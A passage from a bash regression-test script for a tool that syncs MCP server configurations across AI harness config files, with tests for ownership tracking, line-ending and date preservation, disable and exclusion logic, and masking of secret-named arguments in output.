for f in --version -v version; do vload "fixh $f"; eq 0 "$rc" "version_cmd \"fixh $f\" accepted"; done
PYV="$(python3 - "$BIN" <<'PY2'
import importlib.machinery,sys
import importlib.util; _l=importlib.machinery.SourceFileLoader("hms",sys.argv[1]); m=importlib.util.module_from_spec(importlib.util.spec_from_loader("hms",_l)); _l.exec_module(m)
h={"detect":{"commands":["fixh"]}}
print(m.version_probe_argv(h,"claude -p x"), m.version_probe_argv(h,"fixh --version"))
PY2
)"
eq "None ['fixh', '--version']" "$PYV" 'version_cmd re-checked by version_probe_argv before running'
o="$("$BIN" explain --registry "$DIR/../../harnesses" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
eq 0 "$rc" 'all real registry YAMLs pass the version_cmd load check'

# ---------------------------------------------------------------- PDCA round 3 (#4097072123 .. #4097147125, root P5)
# 4097072123: ownership of earlier successful writes survives a later harness fault
SDM="$T/state-r3m"
mk hp1 json mcpServers mcpservers-json "~/.hp1/mcp.json" true null null high
mk hp2 json mcpServers mcpservers-json "~/.hp2blk/sub/mcp.json" true null null high
printf 'x' > "$HOME/.hp2blk"          # a FILE where hp2's config dir must go -> makedirs faults
cat > "$T/ssot-r3.json" <<'EOF'
{"schema":1,"servers":{"p-tool":{"transport":"stdio","command":"npx","args":["-y","p"]}}}
EOF
o="$("$BIN" apply --ssot "$T/ssot-r3.json" --harness hp1,hp2 --registry "$REG" --state-dir "$SDM" 2>&1)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" '#4097072123: later harness fault -> exit 1'
has 'p-tool' "$(cat "$HOME/.hp1/mcp.json" 2>/dev/null)" '#4097072123: earlier harness write landed'
has "$HOME/.hp1/mcp.json" "$(cat "$SDM/manifest.json" 2>/dev/null)" '#4097072123: earlier ownership persisted in the manifest'
o="$("$BIN" plan --ssot "$T/ssot-r3.json" --harness hp1 --registry "$REG" --state-dir "$SDM" --json 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
hasnt 'conflict' "$o" '#4097072123: re-plan sees the earlier entry as owned (no conflict)'
eq 0 "$rc" '#4097072123: re-plan of the earlier harness is clean'
rm -f "$HOME/.hp2blk" "$REG/hp1.yaml" "$REG/hp2.yaml"

# 4097072133 is covered in the N2 block (plan/inventory/verify never chmod; apply repairs)

# 4097072141: TOML CRLF bytes outside the managed table are preserved; mixed endings refused
SDC="$T/state-r3c"
mk hcrlf toml mcp_servers codex "~/.hcrlf/config.toml" true enabled enabled-bool high
printf 'model = "x"\r\n\r\n[other]\r\nk = 1\r\n' > "$HOME/.hcrlf/config.toml"
o="$("$BIN" apply --ssot "$T/ssot-r3.json" --harness hcrlf --registry "$REG" --state-dir "$SDC" 2>&1)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 0 "$rc" '#4097072141: CRLF TOML apply -> exit 0'
CR="$(python3 - "$HOME/.hcrlf/config.toml" <<'PY2'
import sys,re
b=open(sys.argv[1],"rb").read()
print("lone-LF=%d prefix=%s managed=%s" % (len(re.findall(rb"(?<!\r)\n",b)),
      b.startswith(b'model = "x"\r\n\r\n[other]\r\nk = 1\r\n'), b"p-tool" in b))
PY2
)"
eq "lone-LF=0 prefix=True managed=True" "$CR" '#4097072141: original CRLF bytes kept; no LF-only lines introduced'
o="$("$BIN" plan --ssot "$T/ssot-r3.json" --harness hcrlf --registry "$REG" --state-dir "$SDC" --json 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
hasnt '"action": "add"' "$o" '#4097072141: CRLF apply is idempotent'
printf 'model = "x"\r\nk2 = 1\n' > "$HOME/.hcrlf/config.toml"; M0="$(sum "$HOME/.hcrlf/config.toml")"
o="$("$BIN" apply --ssot "$T/ssot-r3.json" --harness hcrlf --registry "$REG" --state-dir "$SDC" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" '#4097072141: mixed line endings refused (exit 1)'
has 'mixed line endings' "$o" '#4097072141: refusal explains mixed endings'
eq "$M0" "$(sum "$HOME/.hcrlf/config.toml")" '#4097072141: mixed-ending file untouched'
rm -f "$REG/hcrlf.yaml"

# 4097072154: claude-desktop syncs stdio entries, never remote; siblings preserved
SDD="$T/state-r3d"; CDD="$HOME/Library/Application Support/Claude"; mkdir -p "$CDD"
cp "$DIR/../../harnesses/claude-desktop.yaml" "$REG/"
printf '{"globalShortcut":"Cmd+K","preferences":{"x":1},"mcpServers":{}}' > "$CDD/claude_desktop_config.json"
cat > "$T/ssot-cd.json" <<'EOF'
{"schema":1,"servers":{"p-tool":{"transport":"stdio","command":"npx","args":["-y","p"]},
 "r-srv":{"transport":"streamable-http","url":"https://r.example.test/mcp"}}}
EOF
o="$(HARNESS_MCP_SYNC_PLATFORM=darwin "$BIN" apply --ssot "$T/ssot-cd.json" --harness claude-desktop --registry "$REG" --state-dir "$SDD" 2>&1)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 0 "$rc" '#4097072154: claude-desktop apply -> exit 0'
CDR="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(sorted(d["mcpServers"]), d["globalShortcut"], d["preferences"], d["mcpServers"]["p-tool"].get("command"))' "$CDD/claude_desktop_config.json")"
eq "['p-tool'] Cmd+K {'x': 1} npx" "$CDR" '#4097072154: stdio written, remote not written, siblings preserved'
o="$(HARNESS_MCP_SYNC_PLATFORM=darwin "$BIN" verify --ssot "$T/ssot-cd.json" --harness claude-desktop --registry "$REG" --state-dir "$SDD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
eq 0 "$rc" '#4097072154: parse-back + verify clean'
rm -f "$REG/claude-desktop.yaml"

# 4097147118: verify flags a still-owned entry excluded by its SSOT selector
SDS="$T/state-r3s"
mk hsel json mcpServers mcpservers-json "~/.hsel/mcp.json" true null null high
run_s() { o="$("$BIN" "$@" --harness hsel --registry "$REG" --state-dir "$SDS" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
run_s apply --ssot "$T/ssot-r3.json"; eq 0 "$rc" '#4097147118: setup apply'
cat > "$T/ssot-excl.json" <<'EOF'
{"schema":1,"servers":{"p-tool":{"transport":"stdio","command":"npx","args":["-y","p"],"harnesses":{"exclude":["hsel"]}}}}
EOF
run_s verify --ssot "$T/ssot-excl.json"
eq 1 "$rc" '#4097147118: verify on a selector-excluded owned entry -> exit 1'
has 'excluded from this harness by its SSOT selector' "$o" '#4097147118: issue names the selector exclusion'
run_s plan --ssot "$T/ssot-excl.json" --json
has '"action": "remove"' "$o" '#4097147118: plan and verify agree (plan removes it)'
rm -f "$REG/hsel.yaml"

# 4097147125: `replaces` legacy membership is per harness
SDR="$T/state-r3r"
mk hrep json mcpServers mcpservers-json "~/.hrep/mcp.json" true null null high
printf '{"mcpServers":{"leg":{"command":"old"}}}' > "$HOME/.hrep/mcp.json"
cat > "$T/ssot-rep.json" <<'EOF'
{"schema":1,"servers":{"new":{"transport":"stdio","command":"npx","args":["-y","n"],"replaces":["leg"]},
 "leg":{"transport":"stdio","command":"old","harnesses":{"include":["other-*"]}}}}
EOF
run_r() { o="$("$BIN" "$@" --harness hrep --registry "$REG" --state-dir "$SDR" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
run_r plan --ssot "$T/ssot-rep.json" --json
has 'needs --adopt leg' "$o" '#4097147125: legacy for other harnesses only -> unmanaged conflict reported here'
run_r apply --ssot "$T/ssot-rep.json" --adopt leg
RR="$(python3 -c 'import json,sys; print(sorted(json.load(open(sys.argv[1]))["mcpServers"]))' "$HOME/.hrep/mcp.json")"
eq "['new']" "$RR" '#4097147125: --adopt leg removes the legacy entry in this harness'
rm -f "$REG/hrep.yaml"

# root P5: config-derived env/header values that are paths or short words do not shred output
SDK="$T/state-r3k"
mk hmask json mcpServers mcpservers-json "~/.hmask/mcp.json" true null null high
CTOK="zQ8vLr2Nx5Wp7Kt3Yb"
printf '{"mcpServers":{"x":{"command":"c","env":{"HOMEP":"%s/.hmask","W":"model","TOK":"%s"}}}}' "$HOME" "$CTOK" > "$HOME/.hmask/mcp.json"
cat > "$T/ssot-mask.json" <<EOF
{"schema":1,"servers":{"my_model":{"transport":"stdio","command":"npx","args":["-y","m","$CTOK"]}}}
EOF
o="$("$BIN" inventory --harness hmask --registry "$REG" --state-dir "$SDK" 2>&1)"; printf '%s\n' "$o" >> "$ALLOUT"
has "$HOME/.hmask/mcp.json" "$o" 'P5: env value equal to a HOME path does not mask the config path'
o="$("$BIN" plan --ssot "$T/ssot-mask.json" --harness hmask --registry "$REG" --state-dir "$SDK" 2>&1)"; printf '%s\n' "$o" >> "$ALLOUT"
has 'my_model' "$o" 'P5: short env word ("model") does not shred key names'
hasnt "$CTOK" "$o" 'P5: secret-looking value never printed by plan'
P5U="$(python3 - "$BIN" "$HOME" "$CTOK" <<'PY2'
import importlib.machinery,sys
import importlib.util; _l=importlib.machinery.SourceFileLoader("hms",sys.argv[1]); m=importlib.util.module_from_spec(importlib.util.spec_from_loader("hms",_l)); _l.exec_module(m)
home,tok=sys.argv[2],sys.argv[3]
m.register_container_values({"mcpServers":{"x":{"env":{"P":home+"/.hmask","T":"~/x/y","W":"model","K":tok},
                                                  "headers":{"Authorization":"Bearer "+tok}}}})
s=m.Redactor.secrets
print(home+"/.hmask" in s, "~/x/y" in s, "model" in s, tok in s, "Bearer "+tok in s,
      m.Redactor.scrub("v="+tok) == "v="+m.SECRET_MASK, tok not in m.Redactor.scrub(home+"/.hmask/"+tok))
PY2
)"
eq "False False False True True True True" "$P5U" 'P5: config-derived paths/short words not registered; secret-looking env+header values still registered and masked'
rm -f "$REG/hmask.yaml"

# ---------------------------------------------------------------- PDCA round 4 (#4097283166 .. #4097283192)
# 4097283166 (P1): SSOT disables a server on a no-disable harness while an UNMANAGED active entry exists
SD4="$T/state-r4"
mk hoff json mcpServers mcpservers-json "~/.hoff/mcp.json" true null null high
printf '{"mcpServers":{"dsrv":{"command":"hand"},"keep":{"command":"k"}}}' > "$HOME/.hoff/mcp.json"
cat > "$T/ssot-off.json" <<'EOF'
{"schema":1,"servers":{"dsrv":{"transport":"stdio","command":"npx","args":["-y","d"],"enabled":false}}}
EOF
run_4() { o="$("$BIN" "$@" --harness hoff --registry "$REG" --state-dir "$SD4" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
H0="$(sum "$HOME/.hoff/mcp.json")"
run_4 plan --ssot "$T/ssot-off.json"
has 'disabled in SSOT (pass --adopt dsrv to remove it)' "$o" '#4097283166: plan reports the still-active unmanaged entry as a conflict'
run_4 apply --ssot "$T/ssot-off.json"
eq 1 "$rc" '#4097283166: apply without --adopt exits 1 (conflict), not a silent success'
eq "$H0" "$(sum "$HOME/.hoff/mcp.json")" '#4097283166: unmanaged entry NOT silently deleted'
run_4 apply --ssot "$T/ssot-off.json" --adopt dsrv
eq 0 "$rc" '#4097283166: apply --adopt dsrv exits 0'
RO="$(python3 -c 'import json,sys; print(sorted(json.load(open(sys.argv[1]))["mcpServers"]))' "$HOME/.hoff/mcp.json")"
eq "['keep']" "$RO" '#4097283166: --adopt removes only the disabled entry; siblings preserved'
run_4 plan --ssot "$T/ssot-off.json" --json
hasnt '"conflict"' "$o" '#4097283166: re-plan after adopt-removal is clean'
rm -f "$REG/hoff.yaml"

# 4097283179 (P1): a MANAGED server later disabled (no disable flag) -> verify flags it, like plan
SD5="$T/state-r4v"
mk hdv json mcpServers mcpservers-json "~/.hdv/mcp.json" true null null high
cat > "$T/ssot-on.json" <<'EOF'
{"schema":1,"servers":{"dsrv":{"transport":"stdio","command":"npx","args":["-y","d"]}}}
EOF
run_5() { o="$("$BIN" "$@" --harness hdv --registry "$REG" --state-dir "$SD5" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
run_5 apply --ssot "$T/ssot-on.json"; eq 0 "$rc" '#4097283179: setup apply (managed)'
run_5 verify --ssot "$T/ssot-on.json"; eq 0 "$rc" '#4097283179: verify clean while enabled'
run_5 verify --ssot "$T/ssot-off.json"
eq 1 "$rc" '#4097283179: verify exits 1 once the SSOT disables it'
has 'disabled in SSOT; harness has no disable flag (plan removes it)' "$o" '#4097283179: issue names the disable drift'
run_5 plan --ssot "$T/ssot-off.json" --json
has '"action": "remove"' "$o" '#4097283179: plan and verify agree (plan removes it)'
run_5 apply --ssot "$T/ssot-off.json"
run_5 verify --ssot "$T/ssot-off.json"
eq 0 "$rc" '#4097283179: after apply removes it, verify is clean'
SHARED="$(python3 - "$BIN" <<'PY2'
import importlib.machinery,sys
import importlib.util; _l=importlib.machinery.SourceFileLoader("hms",sys.argv[1]); m=importlib.util.module_from_spec(importlib.util.spec_from_loader("hms",_l)); _l.exec_module(m)
h={"mcp":{"transports":["stdio"],"supports":{"disable":False}}}
cases=[({"transport":"stdio","enabled":False},"omit"),({"transport":"stdio"},"render"),
       ({"transport":"sse"},"skip"),({"transport":"stdio","harnesses":{"exclude":["x"]}},"not-applicable")]
print(all(m.desired_disposition(h,"x",r)[0]==k for r,k in cases))
PY2
)"
eq True "$SHARED" '#4097283179: plan and verify share one desired_disposition helper'
rm -f "$REG/hdv.yaml"

# 4097283192 (P2): native TOML dates/datetimes in UNRELATED settings do not break apply
SD6="$T/state-r4t"
mk htd toml mcp_servers codex "~/.htd/config.toml" true enabled enabled-bool high
printf 'model = "m"\nstamp = 2026-09-24T10:11:12Z\nday = 2026-09-24\nat = 07:30:00\n\n[other]\nwhen = 1979-05-27T07:32:00\n' > "$HOME/.htd/config.toml"
chmod 600 "$HOME/.htd/config.toml"
run_6() { o="$("$BIN" "$@" --harness htd --registry "$REG" --state-dir "$SD6" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
run_6 apply --ssot "$T/ssot-on.json"
eq 0 "$rc" '#4097283192: apply on a TOML config with native date/datetime/time exits 0'
hasnt 'TypeError' "$o" '#4097283192: no TypeError from JSON-encoding TOML dates'
TD="$(python3 - "$HOME/.htd/config.toml" <<'PY2'
import sys,tomllib,datetime as d
doc=tomllib.load(open(sys.argv[1],"rb"))
print("dsrv" in doc["mcp_servers"], isinstance(doc["stamp"],d.datetime), isinstance(doc["day"],d.date),
      isinstance(doc["at"],d.time), doc["other"]["when"]==d.datetime(1979,5,27,7,32))
PY2
)"
eq "True True True True True" "$TD" '#4097283192: entry written; unrelated native date/datetime/time values preserved'
run_6 apply --ssot "$T/ssot-on.json"
has 'nothing-to-do' "$o" '#4097283192: re-apply is idempotent'
CN="$(python3 - "$BIN" <<'PY2'
import importlib.machinery,sys,datetime as d
import importlib.util; _l=importlib.machinery.SourceFileLoader("hms",sys.argv[1]); m=importlib.util.module_from_spec(importlib.util.spec_from_loader("hms",_l)); _l.exec_module(m)
print(m.entry_hash({"a":d.date(2026,9,24)})!=m.entry_hash({"a":"2026-09-24"}),
      m.entry_hash({"a":d.date(2026,9,24)})==m.entry_hash({"a":d.date(2026,9,24)}))
PY2
)"
eq "True True" "$CN" '#4097283192: a native date never hashes equal to its ISO string'
rm -f "$REG/htd.yaml"

# ---------------------------------------------------------------- PDCA round 6 (#4098643726 .. #4098635224)
# 4098643726 (P1 SECURITY): secret-NAMED args are masked FAIL-CLOSED, whatever the entropy.
# Low-entropy fixture value "abc"; both the `--token=abc` and the `--token abc` forms.
leakcheck() { # $1 form-label $2 mode-label ; checks $o for the standalone fixture value
  if printf '%s' "$o" | grep -Eq '(^|[^A-Za-z0-9])abc([^A-Za-z0-9]|$)'; then
    no "#4098643726: $1 value never printed in $2" "LEAKED in $2"
  else ok "#4098643726: $1 value never printed in $2"; fi
}
for form in eq sp; do
  SDA="$T/state-r6-$form"
  mk "hsa$form" json mcpServers mcpservers-json "~/.hsa$form/mcp.json" true null null high
  if [ "$form" = eq ]; then ARGS='["-y","pkg","--token=abc"]'; else ARGS='["-y","pkg","--token","abc"]'; fi
  printf '{"schema":1,"servers":{"stok":{"transport":"stdio","command":"npx","args":%s}}}\n' "$ARGS" > "$T/ssot-tok-$form.json"
  run_a() { o="$("$BIN" "$@" --harness "hsa$form" --registry "$REG" --state-dir "$SDA" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
  run_a plan --ssot "$T/ssot-tok-$form.json";          leakcheck "$form" plan
  run_a plan --ssot "$T/ssot-tok-$form.json" --json;   leakcheck "$form" "plan --json"
  run_a apply --ssot "$T/ssot-tok-$form.json";         leakcheck "$form" apply
  eq 0 "$rc" "#4098643726: $form apply exits 0 (the value IS written to the file)"
  WROTE="$(python3 -c 'import json,sys; print(any(a in ("abc","--token=abc") for a in json.load(open(sys.argv[1]))["mcpServers"]["stok"]["args"]))' "$HOME/.hsa$form/mcp.json")"
  eq True "$WROTE" "#4098643726: $form entry on disk carries the real value (masking is output-only)"
  run_a apply --ssot "$T/ssot-tok-$form.json" --json;  leakcheck "$form" "apply --json"
  run_a inventory;                                     leakcheck "$form" inventory
  run_a inventory --json;                              leakcheck "$form" "inventory --json"
  run_a doctor;                                        leakcheck "$form" doctor
  run_a doctor --json;                                 leakcheck "$form" "doctor --json"
  run_a verify --ssot "$T/ssot-tok-$form.json";        leakcheck "$form" verify
  run_a verify --ssot "$T/ssot-tok-$form.json" --json; leakcheck "$form" "verify --json"
  rm -f "$REG/hsa$form.yaml"
done
FC="$(python3 - "$BIN" <<'PY2'
import importlib.machinery,importlib.util,sys
_l=importlib.machinery.SourceFileLoader("hms",sys.argv[1]); m=importlib.util.module_from_spec(importlib.util.spec_from_loader("hms",_l)); _l.exec_module(m)
print(m.secret_arg_values(["--token=abc"]), m.secret_arg_values(["--api-key","x1"]), m.secret_arg_values(["--port","8080"]),
      m.mask_secret_args(["--token","abc","--port","80"]))
PY2
)"
eq "['abc'] ['x1'] [] ['--token', '«secret»', '--port', '80']" "$FC" '#4098643726: name-marked values selected at any entropy; non-secret flags untouched'

# 4098643734 (P1): disabled beats a capability skip; 4098635219 (minor): verify treats skip like plan
SDD="$T/state-r6d"
mk hdh json mcpServers mcpservers-json "~/.hdh/mcp.json" false null null high   # no headers, no disable
run_d() { o="$("$BIN" "$@" --harness hdh --registry "$REG" --state-dir "$SDD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
echo '{"schema":1,"servers":{"rsrv":{"transport":"streamable-http","url":"https://mcp.example.invalid/mcp"}}}' > "$T/ssot-r6a.json"
echo '{"schema":1,"servers":{"rsrv":{"transport":"streamable-http","url":"https://mcp.example.invalid/mcp","headers":{"X-K":"${OTHERVAL}"}}}}' > "$T/ssot-r6skip.json"
echo '{"schema":1,"servers":{"rsrv":{"transport":"streamable-http","url":"https://mcp.example.invalid/mcp","headers":{"X-K":"${OTHERVAL}"},"enabled":false}}}' > "$T/ssot-r6off.json"
run_d apply --ssot "$T/ssot-r6a.json"; eq 0 "$rc" '#4098643734: setup: owned remote entry written'
run_d plan --ssot "$T/ssot-r6skip.json" --json
has '"action": "skip"' "$o" '#4098635219: still-enabled + headers on a header-less harness -> skip (preserve)'
run_d verify --ssot "$T/ssot-r6skip.json"
eq 0 "$rc" '#4098635219: verify agrees with plan on skip (no drift reported for an untouched entry)'
hasnt 'drift vs SSOT' "$o" '#4098635219: skipped entry not reported as SSOT drift'
run_d apply --ssot "$T/ssot-r6skip.json"
DK="$(python3 -c 'import json,sys; print("rsrv" in json.load(open(sys.argv[1]))["mcpServers"])' "$HOME/.hdh/mcp.json")"
eq True "$DK" '#4098635219: preserve-on-skip kept for an ENABLED server'
run_d plan --ssot "$T/ssot-r6off.json" --json
has '"action": "remove"' "$o" '#4098643734: disabled + unrenderable -> omit, plan removes the owned entry'
hasnt '"action": "skip"' "$o" '#4098643734: disabled state is not overridden by the capability skip'
run_d verify --ssot "$T/ssot-r6off.json"
eq 1 "$rc" '#4098643734: verify flags the still-active disabled entry'
run_d apply --ssot "$T/ssot-r6off.json"
DK="$(python3 -c 'import json,sys; print("rsrv" in json.load(open(sys.argv[1]))["mcpServers"])' "$HOME/.hdh/mcp.json")"
eq False "$DK" '#4098643734: apply removes the disabled server'
run_d verify --ssot "$T/ssot-r6off.json"; eq 0 "$rc" '#4098643734: verify clean after removal'
rm -f "$REG/hdh.yaml"
DP="$(python3 - "$BIN" <<'PY2'
import importlib.machinery,importlib.util,sys
_l=importlib.machinery.SourceFileLoader("hms",sys.argv[1]); m=importlib.util.module_from_spec(importlib.util.spec_from_loader("hms",_l)); _l.exec_module(m)
dis={"mcp":{"transports":["stdio"],"supports":{"disable":True,"headers":False}}}
print(m.desired_disposition(dis,"x",{"transport":"sse","enabled":False})[0],
      m.desired_disposition(dis,"x",{"transport":"stdio","enabled":False})[0],
      m.desired_disposition(dis,"x",{"transport":"sse"})[0])
PY2
)"
eq "omit render skip" "$DP" '#4098643734: disable-capable harness: disabled+unrenderable=omit, disabled+renderable=render(flag), enabled+unrenderable=skip'

# 4098643743 (P2): doctor checks the PARENT directory (atomic_write temp-file + rename)
SDW="$T/state-r6w"
mk hwd json mcpServers mcpservers-json "~/.hwd/cfg/mcp.json" true null null high
mkdir -p "$HOME/.hwd/cfg"; printf '{"mcpServers":{}}' > "$HOME/.hwd/cfg/mcp.json"; chmod 600 "$HOME/.hwd/cfg/mcp.json"
run_w() { o="$("$BIN" "$@" --harness hwd --registry "$REG" --state-dir "$SDW" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
chmod 555 "$HOME/.hwd/cfg"
if [ "$(id -u)" -ne 0 ]; then   # #4100075066: root ignores directory write bits
  run_w doctor --json
  has '"writable": false' "$o" '#4098643743: writable file in a read-only dir -> writable false'
  run_w doctor
  has 'warn' "$o" '#4098643743: text status shows the failed write check'
  run_w apply --ssot "$T/ssot-r3.json"
  [ "$rc" -ne 0 ] && ok '#4098643743: apply indeed fails in that dir (doctor was right)' || no '#4098643743: apply indeed fails in that dir (doctor was right)' "rc=$rc"
else
  printf '  - skipped 3 read-only-dir checks: running as root (#4100075066)\n'
fi
chmod 755 "$HOME/.hwd/cfg"; chmod 444 "$HOME/.hwd/cfg/mcp.json"
run_w doctor --json
has '"writable": true' "$o" '#4098643743: read-only file in a writable dir -> writable true (rename replaces it)'
chmod 600 "$HOME/.hwd/cfg/mcp.json"
rm -f "$REG/hwd.yaml"

# 4100075041 (Minor): duplicate mapping keys are refused, never silently collapsed on rewrite
SDK7="$T/state-r7d"
mk hdupj json mcpServers mcpservers-json "~/.hdupj/mcp.json" true null null high
mk hdupc jsonc mcpServers mcpservers-json "~/.hdupc/mcp.json" true null null high
mk hdupy yaml extensions goose-extensions "~/.hdupy/cfg.yaml" true enabled enabled-bool high
printf '{"mcpServers":{"a":{"command":"x"},"a":{"command":"y"}}}' > "$HOME/.hdupj/mcp.json"
printf '{\n  // note\n  "mcpServers": {"a": {"command": "x"}, "a": {"command": "y"}}\n}\n' > "$HOME/.hdupc/mcp.json"
printf 'extensions:\n  a: {cmd: x}\n  a: {cmd: y}\n' > "$HOME/.hdupy/cfg.yaml"
for d in hdupj:mcp.json hdupc:mcp.json hdupy:cfg.yaml; do
  id="${d%%:*}"; f="$HOME/.$id/${d#*:}"; M0="$(sum "$f")"
  o="$("$BIN" apply --ssot "$T/ssot-r3.json" --harness "$id" --allow-comment-loss --registry "$REG" --state-dir "$SDK7" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
  has 'duplicate mapping key' "$o" "#4100075041: $id duplicate key -> refused"
  [ "$rc" -ne 0 ] && ok "#4100075041: $id apply exits non-zero" || no "#4100075041: $id apply exits non-zero" "rc=$rc"
  eq "$M0" "$(sum "$f")" "#4100075041: $id file untouched"
done
DK="$(python3 - "$BIN" <<'PY2'
import importlib.util, importlib.machinery, sys
ld = importlib.machinery.SourceFileLoader("hms", sys.argv[1]); sp = importlib.util.spec_from_loader("hms", ld)
m = importlib.util.module_from_spec(sp); ld.exec_module(m)
ok = []
for fmt, txt in (("json", '{"a":1,"b":{"c":1}}'), ("yaml", "a: 1\nb: {c: 1}\nx: &x {k: 1}\ny:\n  <<: *x\n  z: 2\n")):
    try: m.parse_config(fmt, txt); ok.append("ok")
    except Exception as e: ok.append(type(e).__name__)
print(" ".join(ok))
PY2
)"
eq "ok ok" "$DK" '#4100075041: unique keys (and YAML merge keys) still parse'
rm -f "$REG/hdupj.yaml" "$REG/hdupc.yaml" "$REG/hdupy.yaml"

# 4100075046 (Major): a shared config path is claimed only by an installed harness, writable before plan-only
SDP7="$T/state-r7p"; mkdir -p "$HOME/.sharedcfg"; printf '{"mcpServers":{}}' > "$HOME/.sharedcfg/mcp.json"
mk hsa json mcpServers mcpservers-json "~/.sharedcfg/mcp.json" true null null high
mk hsb json mcpServers mcpservers-json "~/.sharedcfg/mcp.json" true null null high
rm -rf "$HOME/.hsa"   # hsa sorts first but is NOT installed
o="$("$BIN" plan --ssot "$T/ssot-r3.json" --harness hsa,hsb --registry "$REG" --state-dir "$SDP7" --json 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
SP="$(printf '%s' "$o" | python3 -c 'import json,sys
d=json.load(sys.stdin); d=d["harnesses"] if isinstance(d,dict) else d
print(" ".join("%s=%s" % (h["id"], h["status"]) for h in d))' 2>/dev/null || echo PARSE-ERROR)"
eq "hsa=not-installed hsb=ok" "$SP" '#4100075046: absent sibling cannot lock the installed harness out of a shared file'
mkdir -p "$HOME/.hsa"; sed -i.bak 's/^skip_reason: null$/skip_reason: "fixture plan-only"/' "$REG/hsa.yaml"; rm -f "$REG/hsa.yaml.bak"
o="$("$BIN" plan --ssot "$T/ssot-r3.json" --harness hsa,hsb --registry "$REG" --state-dir "$SDP7" --json 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
SP="$(printf '%s' "$o" | python3 -c 'import json,sys
d=json.load(sys.stdin); d=d["harnesses"] if isinstance(d,dict) else d
print(" ".join("%s=%s" % (h["id"], h["status"]) for h in d))' 2>/dev/null || echo PARSE-ERROR)"
eq "hsa=skip hsb=ok" "$SP" '#4100075046: writable harness outranks a plan-only sibling on a shared file'
has 'shared with hsb' "$o" '#4100075046: the plan-only sibling names the writer as owner'
rm -f "$REG/hsa.yaml" "$REG/hsb.yaml"

# ---------------------------------------------------------------- PDCA round 8 (Codex P1s on 22f0d45)
# 4100510426 (P1 SECURITY): the value after a secret-named flag is masked whatever its first char;
# also repeated flags, a flag followed by another flag, `--x-key=` empty, and a trailing valueless flag.
SD8="$T/state-r8m"
mk hdash json mcpServers mcpservers-json "~/.hdash/mcp.json" true null null high
printf '{"schema":1,"servers":{"sdash":{"transport":"stdio","command":"npx","args":["-y","pkg","--token","-zq9x","--auth","--token","dup7vq","--api-key=","--password"]}}}\n' > "$T/ssot-dash.json"
run_8() { o="$("$BIN" "$@" --harness hdash --registry "$REG" --state-dir "$SD8" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
dashcheck() { if printf '%s' "$o" | grep -Eq -- '-zq9x|dup7vq'; then no "#4100510426: dash/repeated values never printed in $1" "LEAKED in $1"
  else ok "#4100510426: dash/repeated values never printed in $1"; fi; }
run_8 plan --ssot "$T/ssot-dash.json";            dashcheck plan
has 'value missing' "$o" '#4100510426: trailing secret-named flag without a value is flagged'
run_8 plan --ssot "$T/ssot-dash.json" --json;     dashcheck "plan --json"
run_8 apply --ssot "$T/ssot-dash.json";           dashcheck apply
eq 0 "$rc" '#4100510426: apply exits 0 (values are written; masking is output-only)'
run_8 apply --ssot "$T/ssot-dash.json" --json;    dashcheck "apply --json"
run_8 inventory --json;                           dashcheck "inventory --json"
run_8 verify --ssot "$T/ssot-dash.json" --json;   dashcheck "verify --json"
WD="$(python3 -c 'import json,sys; a=json.load(open(sys.argv[1]))["mcpServers"]["sdash"]["args"]; print("-zq9x" in a and "dup7vq" in a)' "$HOME/.hdash/mcp.json")"
eq True "$WD" '#4100510426: file carries the real dash-prefixed and repeated-flag values'
FD="$(python3 - "$BIN" <<'PY2'
import importlib.machinery,importlib.util,sys
_l=importlib.machinery.SourceFileLoader("hms",sys.argv[1]); m=importlib.util.module_from_spec(importlib.util.spec_from_loader("hms",_l)); _l.exec_module(m)
print(m.mask_secret_args(["--token","-abc","--key","--port","80","--pass"]), m.secret_arg_values(["--api-key="]))
PY2
)"
eq "['--token', '«secret»', '--key', '«secret»', '80', '--pass'] []" "$FD" '#4100510426: next token masked regardless of first char; empty `=` value and trailing flag print nothing'
rm -f "$REG/hdash.yaml"

# 4100510415 (P1 SECURITY): git missing/erroring => visibility "unknown" => secret material refused
SD8G="$T/state-r8g"; NOGIT="$T/nogit-bin"; mkdir -p "$NOGIT"
ln -sf "$(command -v python3)" "$NOGIT/python3"
mk hnog json mcpServers mcpservers-json "~/.hnog/mcp.json" true null null high
printf '{"mcpServers":{}}' > "$HOME/.hnog/mcp.json"; M0="$(sum "$HOME/.hnog/mcp.json")"
printf '{"schema":1,"servers":{"snog":{"transport":"stdio","command":"npx","args":["-y","pkg"],"env":{"K":"${FIXSECRET}"}}}}\n' > "$T/ssot-nog.json"
o="$(PATH="$NOGIT" "$BIN" apply --ssot "$T/ssot-nog.json" --harness hnog --registry "$REG" --state-dir "$SD8G" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
has 'could not check git visibility' "$o" '#4100510415: git missing -> secret-bearing server refused (unknown state)'
eq "$M0" "$(sum "$HOME/.hnog/mcp.json")" '#4100510415: file untouched; secret never written without a git check'
FG="$T/fakegit"; mkdir -p "$FG/a" "$FG/b"
printf '#!/bin/sh\necho "fatal: detected dubious ownership in repository" >&2\nexit 128\n' > "$FG/a/git"
